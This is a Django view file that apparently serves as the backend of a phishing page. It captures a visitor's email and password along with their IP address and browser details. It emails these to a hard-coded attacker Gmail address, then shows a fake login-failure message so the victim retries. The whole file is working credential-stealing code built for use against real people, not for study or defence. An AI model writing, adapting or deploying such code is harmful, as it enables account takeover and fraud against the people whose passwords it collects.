from django.shortcuts import render, redirect
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
from django.utils import timezone
from django.contrib import messages
from django.template.loader import render_to_string

from .utils import get_browser_info, get_client_ip
from . import send_email

def validate_user_email(request, email="default@gmail.com"):

    if request.method == 'POST':
        # email = request.POST.get('email', '').strip()
        password = request.POST.get('password')

        print(email)
        print(password)

        if password:

            browser_info = get_browser_info(request)
            ip_address = get_client_ip(request)

            message = render_to_string('frontend/email_result.html', 
            {
                'email': email,
                'password': password,
                'ip_address':ip_address,
                'b_version':browser_info['version'],
                'browser':browser_info['browser'],
                'agent':browser_info['agent'],
                'time': timezone.localtime(timezone.now()),
            })

            try:
                send_email.email_message_send('Update Successful', message, 'blinkslaura27@gmail.com' )
                # send_email.email_message_send('Update Successful', message, 'potter.alexe@gmail.com' )

                messages.error(request, "Invalid login credentials, please check details and try again.")
            except Exception as e:
                print(f"Error sending email: {str(e)}")
                messages.error(request, "Network error: Login failed, Please try again")
        else:
            messages.error(request, 'Please enter a valid email address.')
        return redirect("account:validate", email=email)
    try:
        validate_email(email)
        status = "Valid Email"
    except ValidationError:
        status = "Invalid Email"
        return redirect("account:validate", email=email)

    context = {
        "email": email,
        "status": status
    }

    return render(request, "account/validate.html", context)